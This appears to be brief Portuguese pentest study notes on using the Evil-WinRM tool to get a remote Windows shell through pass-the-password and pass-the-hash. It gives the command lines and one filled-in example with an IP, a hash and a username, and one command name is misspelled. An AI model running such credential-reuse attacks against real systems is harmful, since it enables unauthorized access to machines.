O EVIL WIN PE UMA FERRAMENTA QUE É USADA PARA EXPLORAR E CONSEGUIR UMA SHELL
PODENDO USAR A TÉCNICA DE PASS-THE-PASSWORD E PASS-THE-HASH.
	
 PASS-THE-PASSWORD:
 	
 	O PASS-THE-PASSWORD É UMA FORMA DE VOCÊ CONSEGUIR A SHELL, MAS PRECISA DO USUÁRIO
	E SENHA PARA CONSEGUIR.	
	
	1.ABRIR O HELP DA FERRAMENTA PARA SABER COMO USA-LA.	
		
		COMANDO: ruby evil-twinrm.rb
		
	2.FAZER O ATAQUE USANDO O IP DO ALVO, USUÁRIO E SENHA DO SMB 
	PARA CONSEGUIR A SHELL.
	
		COMANDO: ruby evil-winrm.rb -i <host> -p <senha> -u <usuario>
		
 PASS-THE-HASH:
 	
 	O PASS-THE-HASH DIFERENTE DO PASS-THE-PASSWORD, SÓ PRECISA
 	DA HASH DA SENHA E DO NOME DO USUÁRIO, PARA CONSEGUIR OBTER
 	A SHELL.
 	
 	
 	1.ABRIR O HELP DA FERRAMENTA PARA SABER COMO USA-LA.	
		
		COMANDO: ruby evil-twinrm.rb
		
	2.FAZER O ATAQUE USANDO O IP DO ALVO, USUÁRIO E SENHA DO SMB 
	PARA CONSEGUIR A SHELL.
	
		COMANDO: ruby evil-winrm.rb -i <host> -H <hash> -u <usuario>
		
		EX: ruby evil-winrm.rb -i 192.167.34.21 -H 4a6646f62d1cfa721e696c535809805f -u Carlos
